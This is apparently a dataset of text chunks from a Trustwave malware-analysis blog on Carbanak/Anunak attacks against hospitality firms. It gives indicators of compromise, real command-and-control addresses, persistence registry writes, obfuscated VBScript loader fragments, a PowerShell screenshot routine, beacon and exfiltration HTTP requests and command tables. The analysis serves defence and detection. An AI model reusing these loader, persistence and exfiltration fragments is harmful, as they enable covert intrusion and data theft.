        "text": "IslandsSomaliaSouth AfricaSouth Georgia and the South Sandwich IslandsSouth KoreaSouth SudanSpainSri LankaSudanSurinameSvalbard and Jan MayenSwazilandSwedenSwitzerlandSyriaTaiwanTajikistanTanzaniaThailandTogoTokelauTongaTrinidad and TobagoTunisiaTurkeyTurkmenistanTurks and Caicos IslandsTuvaluU.S. Virgin IslandsUgandaUkraineUnited Arab EmiratesUnited States Minor Outlying IslandsUruguayUzbekistanVanuatuVatican CityVenezuelaVietnamWallis and FutunaWestern SaharaYemenZambiaZimbabweDeviceI agree to receive other communications from Trustwave. By clicking submit below, you agree to our Terms of Use and Privacy Policy. Additionally, you consent to allow Trustwave to store and process the personal information submitted above to provide you with the content requested.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "In the last month Trustwave was engaged by multiple hospitality businesses for investigations by an unknown attacker or attackers. The modus operandi for all three investigations were very similar and appear to be a new Carbanak gang attack methodology, focused on the hospitality industry. Carbanak is a prolific crime group, well known for stealing over one billion dollars from banks in 2015\u00a0(*Kaspersky estimated loss)\u00a0and more recently orchestrating an attack on the Oracle Micros POS support site that put over one million Point of Sale systems at risk.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The current investigations are still underway but the known indicators of compromise in these new attacks will be presented below. At the time of investigation this malware was not correctly detected by any existing antivirus engines, and domains / IP's were not found in any commercial threat intelligence feeds.\n\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It is also interesting to note that just during the time that it took to write this blog, Carbanak returned to their victims with significantly upgraded malware.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This demonstrates the speed and versatility of this threat group. We have included analysis for two separate versions of AdobeUpdateManagementTool.vbs in this report.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "(The malware used following the initial infection) Version two arrived only two weeks after we began investigating this new campaign.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The attacks began via social engineering. An attacker called the customer contact line saying that they were unable to use the online reservation system and requested to send their information to the agent via email. The attacker stayed on the line until the agent opened the attachment contained in the email and hung up when his attack was confirmed successful. The email attachment was a malicious Word Document that contained an encoded .VBS script capable of stealing system information, desktop screenshots, and to download additional malware.\n A screenshot of the malicious Word document is shown below. The malicious VB Script will use macros to search for instances of Microsoft Word running on the system, if found, it will clear the existing text and replace it with the following text.\n\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The victim system will then reach out to http://95.215.47.105 to retrieve additional malware called AdobeUpdateManagementTool.vbs.\nAdobeUpdateManagementTool.vbs - Indicators of compromise:\nFile name: adobeupdatemanagementtool.vbs\nSHA-1 8d7c90a699b4055e9c7db4571588c765c1cf2358 (Version 1)SHA-1 a91416185d2565ce991fc2c0dd9591c71fd1f627 (Version 2)\n\nCreates folder:\u00a0 %temp%\\WindowsUpdate\nCreates folder:\u00a0%temp%\\WindowsUpdate_\\Dropebox<username>\nAdds file to WindowsUpdate folder:\u00a0vbs\nAdds persistence mechanism to the CURRENT_USER registry hive in the CurrentVersion\\Run and CurrentVersion\\RunOnce keys to autostart AdobeUpdateManagementTool.\n A scheduled task is created named SysChecks which calls the\u00a0vbs\nA service is created named 'ADOBEUPDTOOL' which calls the AdobeUpdateManagementTool.vbs\nThe malware drops a Shockwave Flash icon and disguises itself as such.\n The malware contacts the following and may attempt to download\u00a0doc:\n\nhttp://revital-travel.com/cssSiteteTemplates\nhttp://juste-travel.com/cssSiteteTemplates\nhttp://park-travels.com\n\nAll domains resolve to the same IP address (192.99.14.211)\n\n\nhttp://95.215.46.249\n179.43.133.34\n\n\n The malware may report to the following command and Control Servers, depending on the version used in the attack:\n\nhttp://148.251.18.75\nhttp://95.215.46.221\nhttp://95.215.46.229\nhttp://95.215.46.234\nhttp://81.17.28.124\n\n\n\nThis malware was capable of stealing significant system and network information.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It was also used to download several other reconnaissance tools to map out the network.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Two files of significance,\u00a0el32.exe\u00a0and\u00a0el64.exe,\u00a0are privilege escalation exploits for 32 and 64 bit architectures. Their hashes are as follows:\n\nel32.exe SHA1: 83D0964F06E5F53D882F759E4933A6511730E07B\nel64.exe SHA1: CF5B30E6ADA0D6EE7449D6BDE9986A35DF6F2986\n\nThis malware was primarily responsible for the reconnaissance stage of the attack.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "However, it also downloaded additional malware that enables the next stage of the attack and could execute powershell scripts on command.\n Beaconing - AdobeUpdateManagementTool.vbs\nWe have seen slightly different data beaconing methodologies over the different attacks, but the general approach has remained the same.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Beaconing messages are sent out to 179.43.133.34 via standard HTTP GET requests every 5 minutes.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Using this simple methodology allows the beaconing to hide very well within standard corporate network traffic. The content of the GET request is encoded with Base64 and secondarily encrypted with RC4. Trustwave has written a specialized decoder for this traffic and it can be obtained upon request.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The innocuous nature of this traffic allows it to be stealthy in a corporate network, however, its uniformity of structure also allows analysts to identify it relatively quickly as well.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The network packet times of the GET requests originating from a compromised host occur almost exactly every 300 seconds (5 minutes).",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "No web content is ever returned from the GET request except for code 200 OK, as shown below.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "(**Please note that the name=value pairs have been snipped for confidentiality reasons):\nGET /{random_param_name}.jsp?qqksq=MTgzLTIyIDhBIDkwI \u2026IDNFIDYwIDZCIDU4IEJFIDZCIENFIDY3&kfb4mz=MTgzLTIyIDhBIDkwIEV \u2026 IDBGIDUyIDZDIDhF&xzn8=MTgzLTIyIDhBIDkwIEVGID \u2026 DUyIDZDIDhF HTTP/1.1Connection: Keep-AliveKeep-Alive: 300Content-Type: application/x-www-form-urlencodedAccept: */*User-Agent: Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1Charset: utf-8Host: 179.43.133.34HTTP/1.1 200 OKDate: Tue, 08 Nov 2016 20:12:05 GMTServer: Apache/2.2.22 (Debian)X-Powered-By: PHP/5.4.45-0+deb7u2Vary: Accept-EncodingContent-Length: 0Keep-Alive: timeout=5, max=100Connection: Keep-AliveContent-Type: text/html\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The purpose of the GET request, with nothing coming back except the 200 code, is to \"phone home\" so the attacker knows the compromised system is available for further exploitation. To locate these specific GET requests you can use the following regular expression as an initial filter:\ngrep -E \"GET /[a-z]{1,4}[a-z0-9]{1,6}\\.jsp\\?\" log.txt\nFull analysis of this malware can be found later in this report.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Filename: bf.exeSHA1: 3d00602c98776e2ea5d64a78fc622c4ff08708e3\nThis malware executes a new iteration of svchost.exe and injects its malicious code into this running process. This hides the malware within the svchost.exe process.\u00a0 (*Warning- our analysis has shown that some antivirus firms incorrectly identify this file as ransomware.)\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This file's name is base64 encoded and based on the infected system's MAC code, so identifying it by name will be challenging.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It then searches Kaspersky antivirus processes and terminates them if running on the victim system.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "For persistency, it registers itself as a service with the following details:\nService name: RpcSsSys (this name is random, may vary on different system)Path: \"C:\\Documents and Settings\\All Users\\Application Data\\Mozilla\\svchost.exe\"Display name: Emote Procedure Call (RPC)\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "These tools are all well-known Carbanak malware and variations of them were used in the banking intrusions that made them famous in 2015.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Additionally, the decrypted string references \"anunak_config\"\u00a0which is the encrypted configuration file that it downloads from its control server.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This malware is very multi-functional as it can enable remote desktop, steal local passwords, search user's email, target IFOBS banking systems (which Carbanak used so effectively in recent banking attacks), or install completely different remote desktop programs, such as VNC or AMMYY.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Finally, this malware, like so many others, is designed to target credit card data by scraping memory on Point-of-Sale systems. This leaves little doubt as to its end goal on victim systems. The attacker uses social engineering to gain their foothold in the victim network, downloads reconnaissance tools to scan the network and move laterally into the card holder data environment, and then infects systems able to process card transactions.\n Exfiltration \u2013 bf.exe\nThis malware provides the attacker remote command and control of the victim system via a multifunctional backdoor capability. It communicates via an encrypted tunnel on port 443 with the following IP addresses:\n\n5.45.179.173\n92.215.45.94\n\nThese are also the destinations that stolen data will be exfiltrated to.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This malware may steal credit card data, as well as screen captures, keylogger information, email addresses from the PST file, enable RDP or VNC sessions, or to obtain additional system information.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "If you identify any of these IoC's on your network, you should contact a Trustwave account representative immediately, or reach out directly to the Trustwave SpiderLabs IR team at our 24-hour hotline:\n24hr",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Hotline\u00a0+1 (866) 659-9097\u00a0Option 5International: +1 (312) 873-7500, Option 4\n\nDetailed Analysis of Carbanak Malware:\u00a0Malicious Word Document Attachment / Adobeupdatetool. Vbs (Version 1)\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The dropped script is capable of stealing system information, desktop screenshots and to download / execute additional malware.\n Analysis\nThe encoded VBScript is embedded in OLE compound file.\n\n When the malicious document file is opened, the embedded VBScript (VBE) file is dropped in the Windows %temp% folder.\n The Loader VBScript\nThe dropped VBE file is a loader script that drops, installs and executes a second layer VBScript payload in the victim's system.\n It creates a folder named\u00a0\"WindowsUpdate_\"\u00a0in the Window's %temp% directory, If the folder already exists, it will create the folder in the parent directory where the script resides.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "CReAteFolder sscriptDir\nA registry key is created that points to the Loader's directory\nsh. RegWriTe\"HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\Network\\LdrPath\",sScriPtdIr,\"REG_SZ\"\nThe second VBScript payload is embedded in the loader script as a Base64 string:\n\n The loader script decodes the base64 string.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This is then saved to a file named\u00a0\"AdobeUpdateManagementTool.vbs\"\u00a0into the\u00a0\"\\WindowsUpdate_\"\u00a0folder. Dim run_Pth_scR run_pth_scr=ldrpath+\"\\AdobeUpdateManagementTool.vbs\" dim RUn_Pth\nA persistence registry key is also created by the loader script: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobeUpdateManagementTool\nOn ErrOr Resume NExt sh.RegWrIte\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobeUpdateManagementTool\",run_pth,\"REG_SZ\" ErR_NUmBer=err.number If Err_nuMber<>0 Then cerr1.ErrAdd\"Error #I-9\",0 Err.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "RegWrite\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\AdobeUpdateManagementTool\",ruN_ptH,\"REG_SZ\" Err_Number=eRr.number\nThe loader script adds a scheduled task with a task named \"SysChecks\". The purpose of this scheduled task is to run the payload script (AdobeUpdateManagementTool.vbs) in every 5 minutes\nsh.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "5\",0,falSe\nA SWF icon file is also dropped in the folder in order to disguise the dropped file as a Shockwave Flash file:\n\n A shortcut file is also added in the Windows startup folder as \"AdobeUpdateManagementTool.lnk\"\nSet LinKSTart=sh.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "CreateShoRTcuT(SPath&\"\\AdobeUpdateManagementTool.lnk\") With LinksTart LinksTart. ArGuMeNts=ruN_pth_scr .dEsCription=\"AdobeUpdateManagementTool\" .HoTKeY=\"CTRL+X\" .IconLocation =ico_Filename .TargEtPath=wscRipt_pThPaTH .WiNdoWStyle=7 .WorkinGdirectory =sh.ExpandEnvironmEntStrings(\"%windir%\\System32\") .SaVe\n The Payload Script\nThe payload script is dropped in the \"%temp%\\WindowsUpdate_\"\u00a0as\u00a0\"AdobeUpdateManagementTool.vbs\".\u00a0 The script uses obfuscation, a combination of base64 and integer-ed characters (chr) to hide malicious code.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "#Example of obfuscation: (F9lornwzv1(\"cnVuZGxsMzIga2U=\") & \"\" & chr(29 + 85) & chr(81 + 29) & chr(-42 + 143) & chr(-76 + 184) & chr(-20 + 71) & chr(-51 + 101) & chr(67 + -23) & chr(70 + 13) & chr(-57 + 165) & chr(50 + 51) & chr(-67 + 168) & chr(53 + 59) & \"\")\n The payload script checks if the following folder exists otherwise it creates it: %AllUsersProfile% + \"\\Dropebox\" + <username> (for example in Windows 7 system: C:\\ProgramData\\DropeboxJoePC).\u00a0 This is where it stores additional script files and stolen data:\ndim EZ0uaqbfk9m: EZ0uaqbfk9m = EY4hrd8cuo.ExpandEnvironmentStrings(\"%USERNAME%\") EZ0uaqbfk9m = DT6zmqx4fb( EZ0uaqbfk9m ) FA1pcr7i8c3z = ldrpath +\" \\Dropebox\" + EZ0uaqbfk9m\n The payload has the following functionality:\nSteal system information\n\nSystem Name\nSystem Manufacturer\nSystem Model\nTime Zone\nTotal Physical Memory\nProcessor System Type\nProcessor\nBIOS Version\nNetworking information\nComputer name\nDomain\nUser name\n\n Desktop screenshot\nA powershell script (filename: screenshot__.ps1) is created to screenshot victim's desktop.\n #Desktop screenshot routine, dropped as a powershell $ErrorActionPreference=\"stop\"; try{ [Reflection.Assembly]::LoadWithPartialName(\"System.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Drawing\") function screenshot([Drawing. Rectangle]$bounds, $path){ $bmp = New-Object Drawing. Bitmap $bounds.width, $bounds.height $graphics = [Drawing.Graphics]::FromImage($bmp) $graphics. CopyFromScreen($bounds. Location, [Drawing.Point]::Empty, $bounds.size) $bmp. Save($path) $graphics. Dispose() $bmp. Dispose() } $ScriptDir = Split-Path $script:MyInvocation. MyCommand. Path $pth = $ScriptDir + \"\\screenshot__.png\" $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1500, 1000) screenshot $bounds $pth; }catch{}\nDownloaded malicious executable\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It may also be able to receive additional malware executables and install them on the victim's computer.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Network\nThe malware sends stolen data to the following URI:\nurlArry(0) = \"http://95.215.46.249\" urlArry(1) = \"http://revital-travel.com/cssSiteteTemplates\" urlArry(2) = \"http://juste-travel.com/cssSiteteTemplates\"\nThe data is sent as a data encrypted with RC4 and Base64 It is sent via an HTTP POST tunnel to the attacker's server.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "POST /{random_param_name}.jsp?xz2q=MjgtQUIgMTEgRDYgMEYgMTggNTYgNEUgRDQgODYgQTEgNUQgOTAgRDEgQjAgM0UgNEIgRkEgMDIgRTQgOEUgOUIgNUUgNEEgMTYgMTcgMDIgQzYgRDQgMzcgMUEgNTUgOTggQUIgQjYgMEIgNkUgMTggOUMgMTQgMjcgMEQgNUQgRDUgNUUgMkMgM0IgN0YgQUYgNUUgNzYgMzYgRUUgN0QgODIgRDMgMzYgN0EgNzIgNDYgNjEgNTEgQTcgQ0EgMzI=&hwhv50m=MjgtQUIgMTEgRDYgMEYgMDQgNDkgNzQgQkMgQUUgRkMgNUEgOTcgRDEgQjAgM0UgNEIgRkEgMDIgRTQgOEUgOUIgNUUgNEEgMTYgMTcgMDIgQzYgRDQgMzcgMUEgNTUgOTggQUIgQjYgMEIgNkUgMTggOUMgMTQgMjcgMEQgNUQgRDUgNUUgMkMgM0IgN0YgQUYgNUUgNzYgMzYgRUUgN0QgODIgRDMgMzYgN0EgNzIgNDYgNjEgNTEgQTcgQ0EgMzI=&cfcch9s=MjgtQUIgMTEgRDYgMEYgMUYgNTQgMTcgQkQgODIgODQgNTUgQzkgRDEgQjAgM0UgNEIgRkEgMDIgRTQgOEUgOUIgNUUgNEEgMTYgMTcgMDIgQzYgRDQgMzcgMUEgNTUgOTggQUIgQjYgMEIgNkUgMTggOUMgMTQgMjcgMEQgNUQgRDUgNUUgMkMgM0IgN0YgQUYgNUUgNzYgMzYgRUUgN0QgODIgRDMgMzYgN0EgNzIgNDYgNjEgNTEgQTcgQ0EgMzI= HTTP/1.1 Connection: Keep-Alive Keep-Alive: 300 Content-Type: multipart/form-data; boundary=\"eb3d0b5d91fbde4d7a58ef5b9c954051\" Accept: */* Accept-Language: en-us User-Agent: Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 Charset: utf-8 Content-Length: 7274 Host: 95.215.46.249\n\nDetailed Analysis of Carbanak Malware:\u00a0Malicious Word Document Attachment / Adobeupdatetool. Vbs (Version 2)\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It can receive commands from the attacker to download and execute EXE files, VBScript, or Powershell script files.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Exfiltrated data is sent to the attacker's IP addresses through an HTTP POST tunnel\nAnalysis\nUpon execution AdobeUpdateManagementTool.vbs will query the process in the infected system if it is already running, if an existing instance of the script is already running, it will quit, otherwise it will proceed.\n It then attempts to read the following registry key:\nHKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\Network\\CC - Computer Count\nThe script then generates a unique identifier, using the following format:\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "%md_id% - %l_ver% - %ptrtr% - %compCount%where:%md_id% - XORed Computer name and MAC Address.%l_ver% - hard coded in the malware script e.g. Dim HH5hjs54j69a: HH5hjs54j69a = \"1\"%ptrtr% - hard coded in the malware script e.g Dim HI0cvexizqw: HI0cvexizqw = \"2\"%compCount% - value from the registry key: HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\Network\\CC, default value is the string \"NO\"\nThe malicious script checks if the following folder exists otherwise it creates it:\n%AllUsersProfile% + \"\\Dropebox\" + <username>for example in Windows 7 systemC:\\ProgramData\\DropeboxJoePC\nThe following files will be dropped under this Folder, these files are only created if required by the command sent by the attacker:\n\n screenshot__.ps1 - a powershell script that takes screenshots of the active desktop\nscreenshot__.png - the screenshot image\nexe__.exe - an executable file sent by the attacker\nvb__.vbs - a VBscript sent by the attacker\nps1__.ps1 - a Powershell script sent by the attacker\ninsatller.vbs - updater script sent by the attacker\n\nEvery time this script is executed, it requests commands from the Attacker's control server using HTTP GET request.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "ID %md_id%}<<$>>{MD5 hash of the current Date & Time}\u00a0<- this is encrypted in RC4 with hardcoded key and Base64.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "User-agent: Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 Charset:utf-8 Connection: Keep-Alive Keep-Alive:300 Content-Type: application/x-www-form-urlencoded\nThe script receives three types of information from the GET request:\n\nid = the unique ID of the infected system (%md_id%)\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "cmd = MD5 hash of the attacker's command\ncmduniq = contains a value that signifies that this command is unique\n\nThe commands sent by the attackers are in MD5 hash, this is a anti-analysis technique. Here are the command hashes that the attacker may send:\n\n\n\n\nCOMMAND\n\n\nHASH (MD5)\n\n\nDESCRIPTION\n\n\n\n\ninfo\n\n\ncaf9b6b99962bf5c2264824231d7a40c\n\n\nRetrieves system information.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This command drops and executes the file screenshot__ps1 and the image is saved to screenshot__.png.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The image is then sent to the control server IP address via an HTTP POST tunnel\n\n\n\n\nexe\n\n\n98e83379d45538379c2ac4e47c3be81d\n\n\nThe attacker sends this command with an accompanying executable file that is saved to a file called exe__.exe.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "vbs\n\n\nb3720bcc7c681c1356f77ba9761fc022\n\n\nThe attacker sends this command with an accompanying VBScript that is saved as vb__.vbs. The script is executed and the result returned by the script is saved to a temporary file in the Windows %temp% folder. The results are sent to the control server through an HTTP POST tunnel (see exfiltration detail below).",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Note: the results are encoded in Base64 with the following text format: type: vbs time: {currrent time} result: {result details}\n\n\n\n\nupdate\n\n\n3ac340832f29c11538fbe2d6f75e8bcc\n\n\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This script is saved to insatller.vbs and then executed, it then uninstalls its old version.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The file is deleted 10 seconds after execution.\n\n\n\n\n ps1\n\n\n9ffb800e76372160cbb02415dccd7dec\n\n\nthe attacker sends this command with an accompanying Powershell script that is saved to ps1__.ps. The script is executed and the result is returned by the script and is saved to a temporary file in the Windows %temp% folder. The result is sent to the control server through HTTP POST tunnel (see exfiltration detail below).",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Note: the results are encoded in Base64 with the following text format: type: ps1 time: {currrent time} result: {result details}\n\n\n\n\ndll\n\n\n06416233fe5ec4c5933122e4ab248af1\n\n\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "delete\n\n\n099af53f601532dbd31e0ea99ffdeb64\n\n\nRemoves the service running this script by running this command \"cmd.exe /c \"\"sc delete %ADOBEUPDTOOL%\".",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "scrrunr\n\n\ncbd22ed4f5cd88afcfeae0cfc80ed482\n\n\nNot actually a command, but somewhat an indicator that will be sent to the control server each time a script is executed.\n\n\n\n\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The malware checks for the following registry key if the command has the same cmduniq value. If it is the same, it terminates the script, otherwise it writes the cmdunig value to this registry key:\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\c_last\nFollowing is the System information sent to the control server when the command \"INFO\" is received from the attacker.\n\n OS Name\nVersion\nService Pack\nOS Manufacturer\nWindows Directory\nLocale\nAvailable Physical Memory\nTotal Virtual Memory\nAvailable Virtual Memory\nSystem Name\nSystem Manufacturer\nSystem Model\nTime Zone\nTotal Physical Memory\nProcessor System Type\nProcessor\nBIOS Version\nComputer name\nDomain\nUser name\n\nThis system information is also stored in this registry key:\nHKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\Network\\CLM\nThe result data is exfiltrated after each attackers command is executed.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "ID %md_id%}<<$>>{MD5 hash of Date & Time Now}\u00a0<- this is encrypted in RC4 with hardcoded key and Base64.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "User-agent: Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 Charset:utf-8 Connection: Keep-Alive Keep-Alive:300 Content-Type: \"multipart/form-data; boundary=\"{Random MD5 hash}\"\nThe HTTP POST uses the body format below:\n--{random MD5 hash}Content-Disposition: form-data; name=\"{random name}\"{unique ID and current Date/Time Hash - encrypted with RC4 and Base64}--{random MD5 hash}Content-Disposition: form-data; name=\"{random name}\"pPar1c==={unique ID encrypted with RC4 and Base64}--{random MD5 hash}Content-Disposition: form-data; name=\"{random name}\"pPar2c==={command's MD5 Hash encypted with RC4 and Base64}--{random MD5 hash}Content-Disposition: form-data; name=\"{random name}\"pPar3c==={Results/Data/StolenInformation encypted with RC4 and Base64}\nAfter executing the command and exfiltrating the data, the malware sleeps for 3- 5 minutes (depending on the configuration hard-coded in the script) then loops to request the command again.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Network\nCommand and Control Servers:\n\nhttp://148.251.18.75\nhttp://95.215.46.221\nhttp://95.215.46.229\nhttp://95.215.46.234\nhttp://81.17.28.124\n\n\nDetailed Analysis of Carbanak Malware: bf.exe\nFile Info\n\nFilename:\u00a0bf.exe\nSize:\u00a0267216\nFiletype:\u00a0PE32 executable (GUI) Intel 80386, for MS Windows\nCompile Date:\u00a02016-03-01 08:50:54\nSha1 Hash:\u00a03d00602c98776e2ea5d64a78fc622c4ff08708e3\nMD5 Hash:\u00a0c7b224d95fc96094afd2678cae753dcb\n\nSummary\nThe file is a variant of Anunak/Carbanak malware.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It provides functions from gathering information about the system to downloading and executing additional malware.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It then drops a config file in the %appdata%\\Mozilla folder as well as copy of itself with the filename \"svchost.exe\". The config filename is a base64 string comprising of a unique string and the MAC address of the infected system.\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It then spawns a new svchost.exe process with the command: \"C:\\WINDOWS\\system32\\svchost.exe -k netsvcs\" and then injects its code to that process.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "For persistency, it registers itself as a service with the following details:\nService name: RpcSsSys (this name is random, may vary on different systems)Path: \"C:\\Documents and Settings\\All Users\\Application Data\\Mozilla\\svchost.exe\"Display name: Emote Procedure Call (RPC)\n",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Anti-reversing\nThe malware checks for the \"isDebugged\" flag in the PEB (Process Environment Block). It also checks for significant delay of code execution by utilizing the GetTickCount() function.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Delay in code execution means the process is being debugged.\n Strings are heavily obfuscated to avoid static string analysis.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The malware has a decoder table loaded in memory that is used for its lookup algorithm.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
